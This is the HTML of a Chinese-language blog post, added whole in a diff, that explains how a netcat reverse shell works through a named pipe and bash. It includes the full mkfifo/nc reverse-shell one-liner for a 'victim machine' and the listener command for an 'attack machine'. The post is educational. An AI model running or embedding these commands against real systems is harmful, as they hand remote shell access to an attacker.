@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>对于nc反弹shell的一些疑惑 | MP4Four’s blog</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="对于nc反弹shell的一些疑惑" />
+<meta name="author" content="MP4Four" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="一次平平无常的nc反弹shell操作如下" />
+<meta property="og:description" content="一次平平无常的nc反弹shell操作如下" />
+<link rel="canonical" href="/2021/03/21/nc-related-issues.html" />
+<meta property="og:url" content="/2021/03/21/nc-related-issues.html" />
+<meta property="og:site_name" content="MP4Four’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-21T11:13:57+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="对于nc反弹shell的一些疑惑" />
+<script type="application/ld+json">
+{"url":"/2021/03/21/nc-related-issues.html","author":{"@type":"Person","name":"MP4Four"},"headline":"对于nc反弹shell的一些疑惑","dateModified":"2021-03-21T11:13:57+08:00","datePublished":"2021-03-21T11:13:57+08:00","description":"一次平平无常的nc反弹shell操作如下","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/03/21/nc-related-issues.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>MP4Four's blog</h1>
+        </a>
+        <h2>Code and die</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>21 March 2021</small>
+<h1>对于nc反弹shell的一些疑惑</h1>
+
+<p class="view">by MP4Four</p>
+
+<h3 id="一次平平无常的nc反弹shell操作如下">一次平平无常的nc反弹shell操作如下</h3>
+
+<p><strong>attack machine:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$nc</span> <span class="nt">-l</span> port <span class="nt">-v</span>
+</code></pre></div></div>
+
+<p><strong>victim machine:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f | /bin/bash <span class="nt">-i</span> 2&gt;&amp;1 | nc ip port &amp;&gt;/tmp/f
+</code></pre></div></div>
+
+<p>等价于</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span>/bin/bash <span class="nt">-i</span> 2&gt;&amp;1 &lt;/tmp/f | nc ip port &amp;&gt;/tmp/f
+</code></pre></div></div>
+
+<p>之前看到这个方式知道可以连接，但仍存在一些疑惑，主要是对匿名管道和管道的工作方式不太理解，以为cat会进行阻塞，那么后面的命令便一直在等待，但其实发现并不是。</p>
+
+<h3 id="匿名管道不会进行阻塞">匿名管道不会进行阻塞</h3>
+
+<p>这里所说的阻塞是加入前一个命令因为I/O请求阻塞了，后一个命令依然会继续执行，不会等待前一个命令的输出才运行。看下面这个简单例子</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cat</span> /tmp/f | <span class="nb">echo</span> <span class="s2">"xxx"</span>
+</code></pre></div></div>
+
+<p>（省略了mkfifo这一步骤）由于/tmp/f初始为空，所以cat会进入阻塞状态，等待来自管道的数据，而后面的echo “xxx”并并没有因此收到影响，而是直接执行，因此terminal会输出一个xxx，同时cat仍然在等待着管道f填充数据</p>
+
+<h3 id="尝试和bash联动">尝试和bash联动</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cat</span> /tmp/f | <span class="si">$(</span>which bash<span class="si">)</span> <span class="nt">-i</span>
+</code></pre></div></div>
+
+<p>此命令执行完后没有输出，但并不意味着什么也没发生，当前termial已经新开了一个bash，并且等待着从管道f读取命令</p>
+
+<p>新开一个terminal（tab or window皆可），叫它termial2吧（前一个就叫terminal1），在<strong>terminal2</strong>输入</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$echo</span> <span class="s2">"date -u"</span> <span class="o">&gt;</span> /tmp/f
+</code></pre></div></div>
+
+<p>则terminal1输出此命令和此命令的结果</p>
+
+<p>这里发现在<strong>读取一次输入后自动就exit了</strong>，但是我们的nc反弹shell并不会执行一次命令就gg。这是因为terminal1这条命令的意思就是“<strong>从管道里读入数据，将数据作为bash的输入命令，然后输出bash执行结果至stdout，程序结束</strong>”，没有后续的输入输出，按照逻辑程序自然就结束了。</p>
+
+<p>接下来尝试了下面这个命令 (<strong>terminal1</strong>)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cat</span> /tmp/f | <span class="si">$(</span>which bash<span class="si">)</span> <span class="nt">-i</span> &amp;&gt;/tmp/f
+</code></pre></div></div>
+
+<p><strong>terminal2</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$echo</span> <span class="s2">"pwd"</span> <span class="o">&gt;</span> /tmp/f
+</code></pre></div></div>
+
+<p>结果发现terminal1没有任何输出，在<strong>terminal2</strong>里尝试读取一下管道里的信息</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cat</span> /tmp/f
+</code></pre></div></div>
+
+<p>满屏幕不断滚动，基本逻辑就是“<strong>从管道f里读入数据，bash解释执行此数据，然后将结果重定向至管道f</strong>”，此时管道f里数据不为空，cat接着输出，cat有输出就意味着bash又有输入，于是发现程序并没有退出逻辑，所以周而复始，就死循环了。除了第一个是pwd的正常输出外，其余基本都是错误输出（当然了，pwd的输出很难成为一个有效命令）。</p>
+
+<p>此时再回顾下面命令</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cat</span> /tmp/f | /bin/bash <span class="nt">-i</span> 2&gt;&amp;1 | nc ip port &amp;&gt;/tmp/f
+</code></pre></div></div>
+
+<p>即使初始管道为空，这条命令执行后也会立即和attack machine建立nc连接，此时在attack machine输入命令，回车，命令通过tcp连接发送给victim machine的nc，nc输出被重定向至f管道，然后cat从f管道将命令读出来，传递给bash作为输入，bash执行此条命令后将结果输出传递给nc，nc将结果返回给attack machine，就达成了远程获取shell的成就！</p>
+
+<h3 id="画了一幅图大概长这样">画了一幅图，大概长这样</h3>
+
+<p><img src="/assets/nc-mechanism.png" alt="nc-mechanism" /></p>
+
+<p>如有错误，欢迎指出</p>
+
+
+
+  <small>tags: <em></em></small>
+
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
